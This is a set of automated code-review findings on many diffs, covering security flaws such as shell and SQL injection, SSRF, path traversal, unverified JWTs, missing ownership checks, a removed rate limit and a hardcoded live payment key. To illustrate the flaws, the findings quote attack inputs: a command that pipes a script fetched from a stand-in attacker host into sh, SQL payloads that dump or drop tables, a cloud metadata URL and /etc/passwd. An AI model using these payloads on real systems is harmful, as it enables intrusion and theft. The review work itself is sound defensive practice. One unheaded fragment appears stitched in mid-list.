findings.title: csv_rows does not escape values, producing malformed CSV
findings.body:
`csv_rows` joins `str(r.get(c, ""))` with commas directly, bypassing the `csv_escape` helper defined immediately below it in the same commit. Any cell value containing a comma or a double quote (a free-text field, an address, a name like `Doe, Jane`) emits extra delimiters and shifts every subsequent column for that row, so the output no longer parses back to the intended record. `csv_escape` is also left with no caller in the module, which is the signal that the wiring was simply missed.

Fix: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. Note the argument order — `csv_escape` must receive the already-stringified value (see the related finding on line 12).

findings.title: csv_rows joins raw values, bypassing the new csv_escape helper
findings.body:
`csv_rows` renders each field with `str(r.get(c, ""))` and joins on `","` without passing values through `csv_escape`, which is defined immediately below for exactly this purpose. Any field whose value contains a comma or a double quote will split into extra columns or break quoting in the emitted document, so a party who controls a single field value (e.g. a user-supplied name or description that ends up in a report row) controls the column layout of the exported CSV and can inject values into adjacent columns for whatever consumes the export.

Suggested fix: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`, or use `csv.writer` from the standard library, which handles quoting, embedded newlines and `\r\n` correctly. Note also that `csv_escape` currently assumes a `str` argument (`"," in value`) and will raise `TypeError` on non-string input, so the `str()` conversion must happen before the call.

findings.title: New exporter functions lack any test coverage
findings.body: csv_rows, csv_escape, dump_streaming, dump_pretty, margins_for, and usable_width are all new public functions with no accompanying tests. Bugs such as csv_escape's crash on non-string input, off-by-one chunking in dump_streaming, or wrong margin arithmetic in margins_for/usable_width would go undetected. The repo does have a precedent test (test_csv.py) for csv_header, so extending it to cover the new functions is consistent with existing practice.

findings.title: csv_escape raises TypeError on non-string values
findings.body: `csv_escape` applies the `in` operator directly to `value`, which raises `TypeError: argument of type 'int' is not iterable` for any non-string input. The docstring says "a value", not "a string", and the sibling `csv_rows` shows that cells are arbitrary dict values needing `str()`. Either coerce at the top (`value = str(value)`) or document the string-only contract, so the fix for the `csv_rows` finding cannot introduce a crash on numeric cells.

findings.title: dump_streaming yields nothing for empty rows and dies on chunk_size=0
findings.body: Two boundary cases the happy path skips: with `rows == []` the loop body never runs, so the generator yields no chunks at all rather than a `"[]"` — a consumer concatenating the output writes an empty file instead of valid JSON. And `chunk_size=0` makes `range(0, n, 0)` raise `ValueError: range() arg 3 must not be zero` rather than a clear argument error. `len(rows)`/slicing also silently require a sequence, so passing a generator (a natural thing to do with a function named `dump_streaming`) fails with `TypeError`. Worth either documenting the sequence-only contract or guarding `chunk_size >= 1`.

findings.title: Flaky test depends on real-time midnight boundary
findings.body:
test_token_issued_today_is_valid() calls issue_token() and datetime.now(timezone.utc) separately, then compares .date(). If issue_token() internally captures 'now' at a slightly later instant than the assertion's datetime.now() call, and this happens to straddle midnight UTC, token.issued_at.date() will differ from datetime.now().date() and the test fails — despite the code being correct. This is exactly the kind of test that passes on every run except at the boundary, giving false confidence the rest of the time.

_Also raised by the correctness agent:_ Date-equality assertion is flaky across the UTC midnight boundary

_Also raised by the correctness agent:_ `is_expired` called without the `now` argument used elsewhere

findings.title: No test exercises the CouponExpired branch
findings.body: apply_coupon now raises CouponExpired when coupon.expires_at is in the past, but the only test updated (test_apply_coupon_reduces_total) exercises a non-expired coupon. If the expiry comparison were inverted, removed, or raised the wrong exception, no test would fail.

findings.title: `expires_at` of None or naive datetime raises TypeError, not CouponExpired
findings.body:
`coupon.expires_at < datetime.now(timezone.utc)` assumes `expires_at` is always set and always timezone-aware. Two reachable inputs break it:

- A never-expiring coupon with `expires_at = None` raises `TypeError: '<' not supported between instances of 'NoneType' and 'datetime.datetime'`.
- A naive datetime (e.g. parsed from a DB column without tz, or `datetime.utcnow()`) raises `TypeError: can't compare offset-naive and offset-aware datetimes`.

Both surface as an opaque TypeError to the caller rather than either applying the coupon or raising `CouponExpired`. Guard explicitly, e.g. `if coupon.expires_at is not None and coupon.expires_at < now:`, and normalise naive values to UTC before comparing.

findings.title: Public function `apply_coupon` lacks documentation of expiration check
findings.body: The `apply_coupon()` function now raises `CouponExpired` for expired coupons (lines 9–10), but this behavior is not documented. A caller reading only the function signature would not know that the function can raise this exception or that it compares `coupon.expires_at` to the current time. Add a docstring to document the exception and the expiration logic.

findings.title: Blocking requests.get inside async handler stalls the event loop
findings.body:
`fetch_plan_limits` is declared `async def` but calls `requests.get`, which is a synchronous, blocking I/O call. Inside a coroutine this blocks the entire event loop thread — no other request, timer or task can progress until billing.internal responds or the 5s timeout fires. Under any concurrency this serialises the whole service and turns one slow upstream into a full stall. Note also that the coroutine contains no `await` at all, which is the tell.

Use the same async client style as `fetch_plan` above, e.g. accept an `httpx.AsyncClient` (or build one) and `response = await client.get(...)` against the absolute URL with `timeout=5`. If `requests` must be kept for some reason, wrap it in `asyncio.to_thread(...)` and await that, and drop the now-unused `import requests` once converted.

_Also raised by the docs agent:_ Async function `fetch_plan_limits` performs synchronous blocking I/O

findings.title: Unencoded tenant_id interpolated into internal billing URL
findings.body:
`tenant_id` is formatted straight into the URL path of a request to the internal host `billing.internal` with no validation or percent-encoding. If `tenant_id` originates from a request parameter, a value such as `../admin/keys` or one containing `?`/`#` lets the caller address arbitrary paths (or drop query/fragment semantics) on an internal service that is presumably not reachable from outside — a server-side request forgery / path-traversal primitive against an internal API. `requests` does not strip dot segments, so the rewritten path reaches the origin server.

Fix by validating the identifier against its expected shape (e.g. UUID or `^[A-Za-z0-9_-]+$`) before use, or at minimum `urllib.parse.quote(str(tenant_id), safe="")`. The same treatment applies to the pre-existing `fetch_plan` on line 6 if the value is caller-supplied there too.

findings.title: No test would catch the blocking call inside async fetch_plan_limits
findings.body: fetch_plan_limits uses requests.get (a synchronous, blocking call) inside an async def function. Nothing in this diff exercises this function, so a test verifying it doesn't block the event loop, or even a basic correctness test asserting the returned JSON is passed through, is absent. If this call is later changed to something else blocking or non-blocking, no test would fail either way.

findings.title: Bare `except:` swallows KeyboardInterrupt and SystemExit
findings.body: `except:` with no exception type catches `BaseException`, not just `Exception`. That means a Ctrl-C arriving while `_client.send` is blocked on the network, or a `SystemExit` raised during interpreter shutdown/`sys.exit()` inside the call stack, is caught here and converted into a normal `return None` \u2014 the interrupt is discarded and the caller continues as if nothing happened. If this is called in a retry or polling loop, the process becomes effectively un-interruptible. Narrow it to `except Exception:` (and ideally log the exception so the failure is observable rather than invisible).

findings.title: try_consume checks and updates _counters without holding _lock
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, decides against `LIMIT` on line 16, then yields to the event loop on line 18 before writing on line 19 — all outside `_lock`. Two coroutines for the same tenant can both read the same `current`, both pass the limit check, and both write, so the effective consumption can exceed `LIMIT` by an arbitrary amount under concurrency. Separately, the write is an absolute assignment of `current + cost` rather than a read-modify-write of the latest value, so any increment applied by `consume` (which does hold `_lock`) while `try_consume` is suspended at line 18 is overwritten and lost — the lock in `consume` gives no protection because `try_consume` does not participate in it.

Fix by wrapping the whole read/check/write in `async with _lock:` and re-reading the counter inside the lock (`_counters[tenant] = _counters.get(tenant, 0) + cost`), with no `await` on anything other than lock acquisition between the check and the write.

findings.title: Retry wrapped around non-idempotent charge can double-charge
findings.body:
`@retry(attempts=3)` on `charge_card` will re-invoke `gateway.charge()` whenever the first call raises. The gateway docstring states each POST /charges call creates a new charge and that safety requires passing an Idempotency-Key header. A transient failure after the gateway has already accepted the charge (e.g. a read timeout on a successful POST) will therefore create two or three real charges for one logical payment, and the caller has no way to detect it.

Either generate a stable idempotency key per logical payment and thread it into `gateway.charge(...)` before retrying, or remove the retry here and let the caller decide (as is already done correctly for the read-only `fetch_charge`). Note the retry is also unconditional on exception type — even a definitive 4xx rejection will be replayed.

An allow-list written the same way fails closed (denial of service, not bypass).

Also note `URL()` normalises (percent-encoding, dot-segment and default-port handling), so even code that does `str(exc.location)` may see a value different from what it wrote, which can desynchronise a validator from what it thinks it approved.

findings.title: readany can return b'' before EOF after a dataless wakeup
findings.body: `_wait()` is documented to resolve the waiter at the end of a chunk even when no new data landed in the buffer, and it explicitly instructs callers to re-check their condition after waking. Replacing the `while` loop with an `if` means that after a single dataless wakeup, control falls straight through to `self._read_nowait(-1)` on line 8 with `self._buffer` still empty and `self._eof` still false, so `readany()` returns `b''`. Since an empty return from `readany()` is the end-of-stream sentinel, consumers looping `while True: chunk = await resp.content.readany(); if not chunk: break` will silently truncate the body mid-stream. Restore the loop (`while not self._buffer and not self._eof:`) so the condition is re-evaluated after each wakeup.

findings.title: Implicit relative import breaks `import requests` on Python 3
findings.body: `from adapters import HTTPAdapter` resolves `adapters` as a top-level module, not as `requests.adapters`. Implicit relative imports were removed in Python 3 (PEP 328), so importing `requests.sessions` — and therefore `requests` itself — raises `ModuleNotFoundError: No module named 'adapters'` unless the `requests/` directory happens to be on `sys.path` (e.g. running a script from inside the package). findings.title: Import resolved via sys.path allows `adapters` module shadowing
findings.body:
`from adapters import HTTPAdapter` no longer names the package-local module. On Python 3 (and on Python 2 whenever the relative lookup does not win) the name is resolved through `sys.path`, whose first entry is the invoking script's directory — and `''`/CWD for `-c`, REPL and some launchers. Any writable directory on that path lets an unprivileged local user or a co-located process drop an `adapters.py` that is imported instead of `requests/adapters.py`, running its module-level code inside the importing application and supplying an attacker-defined `HTTPAdapter` (which controls TLS verification, proxies and connection pooling for every request made through a `Session`).

The entry point here is the filesystem/`sys.path`, not a network-facing parameter — I do not see an attacker-controlled request value reaching an interpreter in this diff, so this is an untrusted-search-path issue (CWE-426) rather than injection. Restore the explicit relative form: `from .adapters import HTTPAdapter`.

`HTTPRequest.cookies` is documented to return `None` when a Cookie header is present but cannot be parsed. With the guard removed, `name in self.request.cookies` evaluates `name in None`, which raises `TypeError: argument of type 'NoneType' is not iterable`. This turns a malformed client-supplied Cookie header into a 500 for any handler that calls `get_cookie` — the exact crash the removed guard existed to prevent, and it is remotely triggerable by an unauthenticated request. Restore the check, e.g. `if self.request.cookies is not None and name in self.request.cookies:`, or have callers rely on a normalised empty dict instead of `None`.

_Also raised by the docs agent:_ get_cookie can crash on malformed Cookie header

findings.title: Malformed Cookie header causes TypeError in get_cookie (remote DoS)
findings.body:
`HTTPRequest.cookies` is documented to return `None` when the Cookie header is present but cannot be parsed (see tornado/httpserver.py, the `cookies` property). Removing the `is not None` check means `name in self.request.cookies` evaluates `name in None`, which raises `TypeError: argument of type 'NoneType' is not iterable`.

Entry point: the `Cookie` request header, fully attacker-controlled and unauthenticated. Sink: line 3 of `get_cookie`. Every handler that reads a cookie — including auth paths built on `get_secure_cookie`/`get_current_user` — turns an attacker-chosen malformed header into an unhandled exception and a 500 response, i.e. a trivially reproducible per-request denial of service and noisy error surface.

Restore the guard (`if self.request.cookies is not None and name in self.request.cookies:`), or alternatively make the `cookies` property return an empty dict on parse failure so all consumers are safe by construction.

findings.title: No test exercises get_cookie with an unparsable Cookie header
findings.body: The change removes the `is not None` guard around `self.request.cookies`, which per the `cookies` property docstring can be None when the Cookie header is present but malformed. With this change, `name in self.request.cookies` will raise a TypeError in that case. There is no test in this diff (or apparently in the existing suite, since this exact guard was previously added specifically to fix this crash) that calls `get_cookie` with a malformed Cookie header, so this regression would not be caught by CI.

findings.title: Dropping .strip() breaks boundary detection for multipart bodies
findings.body: `content_type.split(";")` on a typical header such as `multipart/form-data; boundary=----WebKitFormBoundaryABC` yields the second element as `" boundary=----WebKitFormBoundaryABC"` — with the leading space that follows the semicolon (RFC 7231 permits OWS after `;`, and essentially every client emits it). Without `.strip()`, `field.partition("=")` produces `k == " boundary"`, so the `k == "boundary"` test on line 5 never succeeds, `_parse_mime_body` is never called, and the request's form fields and file uploads are silently dropped with no error raised. Restore the strip: `k, sep, v = field.strip().partition("=")`. Note the value side also needs whitespace/quote handling to remain correct for headers written as `boundary = "x"`, which `.strip()` previously covered on the key at minimum.

findings.title: Dropping .strip() makes multipart boundary parsing whitespace-sensitive
findings.body:
Entry point: the attacker/client-controlled `Content-Type` request header, split on `;` into `fields` (line 2). Sink: the `boundary` value passed to `self._parse_mime_body(v, data)` (line 6).

RFC 9110/2045 allow optional whitespace around parameters, and virtually every client emits `multipart/form-data; boundary=----WebKitFormBoundary...`. With `.strip()` removed, `field` is `" boundary=----..."`, so `k` is `" boundary"`, the `k == "boundary"` test on line 5 fails, the loop exhausts, and `_parse_mime_body` is never called. The body is silently discarded — no error, no log — so `request.body_arguments` and `request.files` come back empty for well-formed uploads.

Security relevance: this creates a parser differential. Any front-end that parses multipart per spec (reverse proxy, WAF, upload scanner, request logger) sees fields and files that Tornado's handler does not, and conversely an attacker can choose whether Tornado parses the body at all simply by including or omitting the space after the semicolon. Handlers whose validation is conditional (`if self.request.files: validate(...)`) take the no-files branch for a request that upstream components treated as an upload.

Restore the strip (or, better, strip only the key: `k, sep, v = field.strip().partition("=")`, matching the removed line) so parameter matching is whitespace-insensitive.

findings.title: No test guards multipart boundary parsing with spaced parameters
findings.body: The change removes `.strip()` from `field.partition("=")`, which will break parsing of the common `Content-Type: multipart/form-data; boundary=...` format (with a space after the semicolon), since `k` would then be `" boundary"` instead of `"boundary"`, causing the equality check `k == "boundary"` to fail and silently drop multipart bodies. No test file is included in this diff to catch such a regression; if this behavior change is wrong, nothing in the current test suite (not shown, but absent from this diff) would fail.

findings.title: No test exercises the LocationParseError message formatting
findings.body: The change breaks the format string by removing the % url argument while leaving the %s placeholder, which will raise a TypeError when this exception path is triggered (e.g. parsing a URL with a non-numeric port). No test in this diff (or apparently in the surrounding suite) exercises this branch, so nothing would catch this regression.

findings.title: Format placeholder left unsubstituted in LocationParseError message
findings.body: The message string still contains a `%s` placeholder but no longer supplies an argument, so the raised exception reads literally `Failed to parse: %s`. The offending URL — the only actionable piece of information in this error — is lost, and the raw placeholder will surface in logs and user-facing tracebacks. Restore the interpolation: `raise LocationParseError("Failed to parse: %s" % url)` (or use the URL in whatever shortened form is intended).

findings.title: Shell command injection via interpolated name/directory in create_archive
findings.body:
`create_archive` formats `name` and `directory` directly into a command string (line 9) and executes it through a shell (`shell=True`, line 10). Any shell metacharacter in either argument escapes the intended `tar` invocation: e.g. `name = "x; curl attacker.sh | sh"` or `name = "$(id)"` yields arbitrary command execution with the privileges of the service process. A leading `../` in `name` additionally writes the archive outside `/exports/`.

Fix by dropping the shell and passing an argument list, as `list_exports` on line 5 already does:

```python
archive_path = os.path.join("/exports", f"{name}.tar.gz")
subprocess.run(["tar", "-czf", archive_path, directory], check=True)
```

Also validate `name` against a strict allowlist (e.g. `^[A-Za-z0-9_-]{1,64}$`) and resolve `archive_path` to confirm it stays under `/exports` before writing, so path traversal is closed as well as injection.

findings.title: Unquoted interpolation breaks for names/directories with spaces
findings.body: `cmd` is built by string interpolation and handed to `shell=True`, so the shell word-splits the result. A perfectly ordinary input such as `directory="/data/my exports"` becomes two arguments to `tar`, which then tries to archive `/data/my` and `exports` and fails (or silently archives the wrong thing if both happen to exist). The same applies to `name`. Build the command as an argument list instead — `subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)` — which also removes the need for `shell=True`. Note the sibling `list_exports` on line 5 already uses the list form, so this is a regression from the file's own pattern.

findings.title: No test exercises create_archive's command construction
findings.body: create_archive builds a shell command via f-string interpolation and runs it with shell=True. There is no test in this diff (or evident elsewhere) verifying the command produced for a given name/directory, or that dangerous input is handled. If the interpolation logic were changed (e.g. to fix the injection risk) or broken further, nothing would fail.

findings.title: Public function `create_archive` lacks contract documentation
findings.body: The function `create_archive(name, directory)` is exported at module level with no docstring. A caller cannot determine from the signature alone what it returns, what exceptions it may raise, or what the `name` parameter should contain (e.g., whether it is a filename, a path component, or something else). This leaves room for misuse.

findings.title: dashboardCors allows any origin with credentials enabled
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`, while the configuration immediately above restricts requests to the `ALLOWED` allowlist with the same credential setting. Any route mounted with `dashboardCors` drops origin-based access control entirely: a page on an attacker-controlled domain can issue cross-origin requests that carry the victim's session cookies or `Authorization` header and read the responses, i.e. full CSRF-plus-read against every dashboard endpoint for any logged-in user who visits an attacker page.

Note also that `*` with credentials is self-contradictory under the CORS spec — browsers reject `Access-Control-Allow-Origin: *` on credentialed requests — so this is either a live any-origin hole (if the middleware or a downstream proxy reflects the request `Origin` instead of emitting a literal `*`) or a silently broken endpoint. Neither is the intended outcome.

Fix: reuse `ALLOWED`, or supply an origin callback that validates the incoming `Origin` against an explicit allowlist of dashboard origins. Only drop `credentials: true` if the dashboard genuinely needs to be public and unauthenticated.

findings.title: origin "*" with credentials:true is rejected by browsers
findings.body:
With `origin: "*"`, the `cors` middleware emits the literal header `Access-Control-Allow-Origin: *`. The Fetch/CORS spec requires that for a request whose credentials mode is `include`, the `Access-Control-Allow-Origin` value must be an exact origin echo, not `*`; otherwise the browser fails the check and the response is not exposed to the page. So this config does not achieve what it is evidently trying to do — it makes every credentialed dashboard request fail instead of succeeding. Note also that `credentials: true` here only controls `Access-Control-Allow-Credentials`; it does not change the origin header.

To actually open CORS for the dashboard while keeping cookies/auth headers working, reflect the request origin against an allowlist, e.g. an `origin` callback (or array) containing the dashboard origins, as the existing export above appears to do with `ALLOWED`. If credentials are genuinely not needed for the dashboard, drop `credentials: true` and keep `"*"` — but then session cookies will not be sent, which is likely a second behavioural surprise for callers.

findings.title: Live AcmePay secret key hardcoded, replacing env var lookup
findings.body:
`ACMEPAY_SECRET_KEY` is committed as a literal and assigned to `acmepay.api_key`, replacing the previous `os.environ["ACMEPAY_SECRET_KEY"]` read (the `import os` line is removed in the same hunk). The `acme_live_` prefix indicates a production credential, not a test one. Anyone with read access to the repo — and anyone who ever gets a clone, a CI log, a fork, or a container image layer — now holds a payments credential.

Actions: (1) treat this key as compromised and rotate it at the provider immediately; (2) restore the `os.environ["ACMEPAY_SECRET_KEY"]` lookup (or a secrets-manager fetch); (3) purge the literal from git history, since reverting the commit leaves it readable in the object store; (4) consider adding a secret-scanning pre-commit hook so `acme_live_*` literals are rejected.

findings.title: Hardcoded live key removes per-environment configuration
findings.body:
`client()` previously read `ACMEPAY_SECRET_KEY` from the environment, so each deployment (dev, CI, staging, prod) supplied its own key. It now assigns a fixed literal whose prefix is `acme_live_`, so every process that calls `client()` — including local runs and CI — will authenticate against the live payments account and can issue real charges/refunds. There is also no longer any way to rotate or override the key without a code deploy.

Restore the environment lookup (or route it through whatever config/secret loader the service uses) and keep the value out of the module. If a default is genuinely wanted, it must not be a live credential; use `os.environ.get(...)` with an explicit failure when unset so a misconfigured environment fails loudly rather than silently targeting production.

findings.title: client() behavior change is not exercised by any test
findings.body: client() now sets acmepay.api_key from the new ACMEPAY_SECRET_KEY constant instead of os.environ. The only test-related file touched, tests/fixtures/acmepay.py, defines a fixture (fake_client, TEST_KEY) but contains no test function or assertion that calls client() and checks acmepay.api_key. If this wiring were wrong (e.g. wrong constant name, wrong assignment target, key never applied), nothing in this diff would fail.

findings.title: tenant_of trusts an unverified token's tenant_id claim
findings.body:
`tenant_of` calls `jwt.decode(..., options={"verify_signature": False})`, so the returned `tenant_id` comes from a payload whose signature was never checked — and in PyJWT, disabling signature verification also disables the registered-claim checks (`exp`, `aud`, `iss`) unless they are re-enabled explicitly. Any caller that uses this value to scope a query or a permission check is scoping it to a value the client fully controls: re-encode the payload with a different `tenant_id` and no key is needed. Note the divergence from `claims_for` on line 7, which does verify with `public_key()` and RS256 — two functions reading the same token now disagree about whether it is trustworthy. Derive the tenant from the verified claims instead, e.g. `return claims_for(token)["tenant_id"]`; if the motivation was avoiding a key lookup, cache `public_key()` rather than skipping verification.

_Also raised by the security agent:_ tenant_id read from JWT with signature verification disabled

findings.title: No test coverage for new tenant_of() unverified-decode path
findings.body: tenant_of() introduces a new, security-relevant behavior (extracting tenant_id from a JWT without verifying its signature) but no test file is present in this diff. There's nothing to catch a regression here, e.g. if the key changes, if tenant_id is missing/malformed, or if verify_signature is later flipped back on unintentionally — none of these would be caught by any existing test.

findings.title: Missing tenant_id claim raises KeyError; malformed token raises DecodeError
findings.body: Line 12 indexes `tenant_id` unconditionally, so a token that decodes but carries no `tenant_id` claim raises `KeyError` rather than a domain-specific auth failure, and a malformed token makes line 11 raise `jwt.DecodeError`. If callers treat `tenant_of` as a lookup that either yields a tenant or signals "unauthenticated", both of these will surface as unhandled 500s. Use `unverified.get("tenant_id")` with an explicit check, or wrap the decode and raise the same error type the rest of the auth layer uses.

findings.title: Missing ownership check lets any user modify any payment method
findings.body:
`update_payment_method` resolves `pm_id` (caller-supplied, from the route/request) straight into `PaymentMethod.get(pm_id)` and then writes `body["billing_name"]` and calls `pm.save()` — with no authorisation step between load and mutate. `current_user(request)` is assigned to `user` on line 11 but never used; its docstring in `api/auth.py` explicitly says it is "Authentication only — never authorisation."

The read handler directly above (line 6) does the right thing: `require_owner(current_user(request), pm)`. Any authenticated user can enumerate or guess `pm_id` values and rewrite the billing name on another user's stored card.

Fix: insert `require_owner(user, pm)` immediately after line 12, before any field assignment, matching the pattern on line 6.

Separately, `body["billing_name"]` on line 13 is an unchecked dict access on request-controlled JSON — a missing key raises `KeyError` rather than a 400, which is at best a noisy 500 and at worst an internal-detail leak.

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

_Also raised by the correctness agent:_ Unvalidated body key raises KeyError on malformed request

findings.title: No test guards against missing ownership check on update
findings.body: update_payment_method loads a PaymentMethod by id and mutates it without calling require_owner, unlike the adjacent get handler which does call it (line 6). No test file is included in this diff, so there is nothing that would fail if a user updates another user's payment method. Add a test that attempts to update a payment method owned by a different user and asserts a Forbidden/403 response.

findings.title: Public API contract violated: no ownership check documented
findings.body: The `update_payment_method` function mutates a PaymentMethod object without calling `require_owner()`, violating the explicit convention stated in `auth.py:8` that 'every object mutation must call this.' A caller reading the docstring in `auth.py` would expect this endpoint to perform an ownership check. Either implement the check (calling `require_owner(user, pm)` after line 12) or add a docstring explaining why this endpoint diverges from the documented pattern.

findings.title: Rate limit removed from password reset endpoint
findings.body:
`request_reset` was previously protected by `@rate_limit("5/hour")`; the decorator and its import are deleted, so the handler now calls `send_reset_email(email)` on every request with no throttling. The `email` parameter is caller-supplied, so an unauthenticated attacker can drive unbounded reset-mail sends: mail-bombing a chosen victim, burning the outbound mail quota/sender reputation, and — if the response or timing differs for unknown addresses — enumerating registered accounts cheaply. It also removes the ceiling on how many valid reset tokens can be minted for one account at once.

If the limiter is being moved to middleware or a gateway, that should land in the same change; otherwise restore the decorator, ideally keyed on both source IP and normalised email so neither axis alone lets an attacker spin.

findings.title: Reset endpoint now sends mail unconditionally with no throttle
findings.body: `request_reset` previously ran behind `@rate_limit("5/hour")`. With the decorator and its import removed, the body has no remaining guard: every invocation reaches `send_reset_email(email)` and returns `{"sent": True}`. The function therefore performs an unbounded, caller-controlled outbound side effect \u2014 an attacker (or a buggy client retry loop) can drive arbitrarily many reset mails to any address, burning the mail quota and mailbombing the victim, and making reset-token guessing cheap. If the throttle was intentionally moved, it should be visible \u2014 either middleware applied to this route or an explicit check inside the function. Nothing in the diff shows that, so restore the decorator or point at the replacement control.

findings.title: No test guards rate limiting on password reset endpoint
findings.body: The `@rate_limit("5/hour")` decorator was removed from `request_reset`, but no test in this diff (or apparently in the surrounding repo, since none is shown) asserts that repeated calls to this endpoint are throttled. If this removal is a regression, nothing would fail: a test that calls `request_reset` multiple times in quick succession and expects a rejection after the limit is exceeded would have caught this change. Consider adding such a test to guard against silent removal of rate limiting on sensitive endpoints like password reset.

findings.title: read_export_preview skips _confined, allowing path escape
findings.body:
The existing reader resolves the caller-supplied `name` through `_confined(name)` (line 14) before opening it. The new `read_export_preview` instead does `os.path.join(EXPORT_ROOT, name)` with no normalisation or containment check. `os.path.join` discards the root entirely when `name` is absolute (e.g. `/etc/passwd`), and `..` segments walk out of `EXPORT_ROOT` otherwise, so any caller that can influence `name` reads arbitrary files (the first `limit` bytes of them). Route the path through the same `_confined(name)` helper: `path = _confined(name)` followed by `fh.read(limit)`. Any containment behaviour that lives only in `_confined` is otherwise silently absent from this code path, which is exactly the inconsistency that makes it easy to miss later.

_Also raised by the security agent:_ Path traversal: read_export_preview skips _confined()

_Also raised by the tests agent:_ No test guards read_export_preview against path traversal

findings.title: Public function lacks contract documentation and safe-path guarantees
findings.body: The function `read_export_preview` is a public handler (by parallel to `read_export`) but provides no docstring explaining its contract. Critically, it does not call `_confined()` on the path argument as `read_export` does on line 14, meaning it accepts arbitrary paths. A caller cannot determine from the name, signature, or any documentation whether this function safely confines paths or permits traversal, creating a correctness trap. Either: (1) add a docstring explicitly documenting that it requires pre-validated input, or (2) apply `_confined()` and document that paths are automatically confined.

findings.title: bulk_export no longer verifies report ownership (cross-tenant read)
findings.body:
`require_owner` was dropped from the import on line 1 and the `for report in reports: require_owner(user, report)` loop was deleted, so `bulk_export` now fetches every `Report.get(rid)` for caller-supplied `report_ids` and serialises them on line 7 with no tenant check. `current_user(request)` is still called on line 5 but `user` is now unused, which confirms the only thing it was used for was the authorisation check. Any authenticated user can enumerate or guess report IDs and read another tenant's data. Restore the check — it can be kept cheap by filtering in the fetch (e.g. `Report.where(id__in=report_ids, tenant_id=user.tenant_id)`) rather than looping, but it must not be removed. Note that a filtered query silently drops unauthorised IDs whereas the old code raised `Forbidden`; pick the behaviour deliberately.

_Also raised by the security agent:_ Ownership check removed from bulk_export enables cross-tenant IDOR

findings.title: No test guards against removal of ownership check in bulk_export
findings.body: The diff removes the per-report `require_owner(user, report)` call from `bulk_export`, eliminating tenant isolation for this endpoint. No test file is included in this change. If a regression test existed that exercised bulk_export with reports belonging to a different tenant and expected a Forbidden error, it would have failed and blocked this PR — but no such test appears to have been run/updated here. This means a cross-tenant data leak in bulk_export can ship without any test catching it.

findings.title: SQL injection via f-string interpolation in search_customers
findings.body:
`search_customers` concatenates the `term` and `status` arguments into the SQL text with an f-string and then calls `execute(sql)` with no parameter tuple, so the database driver never gets a chance to quote them. Any caller value containing a single quote breaks out of the literal: e.g. `status = "x' OR '1'='1"` returns every customer row, and `term = "%'; DROP TABLE customers; --"` (or a `UNION SELECT` payload) lets the caller read or destroy arbitrary data with the billing database's privileges.

Fix by keeping the wildcards in the bound value rather than in the SQL text, matching the pattern on line 5 and the contract documented in `billing/db.py`:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

findings.title: search_customers interpolates values instead of passing params to execute()
findings.body:
`billing.db.execute` documents that "`params` must carry every caller value", and `get_customer` on line 5 follows that by passing `(customer_id,)` with a `%s` placeholder. Line 9 instead folds `term` and `status` straight into the SQL text and line 10 calls `execute(sql)` with `params` omitted, so no value is ever bound.

Beyond the injection exposure this creates, it is simply incorrect for ordinary input: a name like `O'Brien` closes the quote and yields a malformed statement, and a term containing `%` or `_` is silently treated as a LIKE wildcard rather than a literal character. A bare `%` in `term` will also be consumed as a format specifier by the driver in the `%s`-paramstyle used on line 5, since the string reaching `_cursor.execute` now contains unescaped percent signs with no params argument.

Rewrite in the same shape as `get_customer`:

    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))

and escape LIKE metacharacters in `term` if literal matching is intended.

findings.title: Public function lacks documented contract for input safety
findings.body: The `search_customers` function is a public API that accepts user-supplied inputs (`term` and `status`) but provides no documentation about what validation, if any, the caller is responsible for. This is critical because the implementation uses these parameters directly in an f-string SQL query without sanitization. A caller reading only the signature might reasonably assume the function handles its own safety, leading to exploitation.

findings.title: New search_customers function has no test coverage
findings.body: search_customers builds a raw f-string SQL query and passes it to execute() with no params, unlike the parameterised get_customer above it. There is no test in this diff exercising this function, so a test would not catch the injection vector, nor would it catch any future accidental regression in query construction (e.g. if someone tried to fix it by parameterising and got the query wrong). Add a test that asserts the query and params passed to execute() are safely parameterised (e.g. via a fake/mock db.execute capturing sql and params), for both term and status inputs including special characters.

findings.title: SSRF: verify_endpoint fetches arbitrary URL, bypassing ALLOWED_HOSTS
findings.body:
`verify_endpoint(url)` passes the URL straight to `requests.get` with no host allowlist and no scheme restriction, while the function directly above it (lines 8-10) refuses to post unless `host in ALLOWED_HOSTS`. Any caller path that reaches this helper with a customer-supplied webhook URL — which is what this PR is adding webhook registration for — can make the server issue GET requests to internal addresses: `http://169.254.169.254/latest/meta-data/...` for cloud instance credentials, `http://127.0.0.1:<port>/` for admin-only services, or `file://`/`http://[::1]` variants. The returned `status_code` is enough to use this as an internal port/host scanner even when the body is not echoed.

Fixes to apply together:
- Reuse the same host extraction + `ALLOWED_HOSTS` check used at lines 8-9 (factor it into a shared validator so the two entry points cannot drift again).
- Reject any scheme other than `https` (and `http` only if genuinely needed) before the request.
- Resolve the hostname and reject loopback, link-local (169.254.0.0/16), and RFC1918 ranges, since an allowlisted or attacker-controlled DNS name can point at them.
- Pass `allow_redirects=False`, otherwise a permitted host can 302 the request to an internal target and defeat the pre-request check.

Entry point caveat: the code that calls `verify_endpoint` is not in this diff and no repository context was retrieved, so I cannot show the request handler that supplies `url`. The PR description states the URL is caller-supplied, and the helper is exported from an `integrations/` module with no internal-only marker, so it should be treated as reachable with untrusted input.

_Also raised by the correctness agent:_ verify_endpoint bypasses the ALLOWED_HOSTS check used by the send path

findings.title: verify_endpoint has no test coverage at all
findings.body: The new verify_endpoint function makes a server-side HTTP GET to a caller-supplied URL with no host/scheme validation (unlike the existing post path above it, which checks ALLOWED_HOSTS). No test exists for this function, so nothing would catch a regression, an SSRF-enabling change, or a broken return-value contract (e.g. if requests.get raises or returns unexpected status codes). Add tests that exercise this function against disallowed/internal hosts and confirm expected behavior (rejection or allowlist enforcement, matching the pattern used for the sibling function).

findings.title: verify_endpoint raises instead of reporting an unreachable endpoint
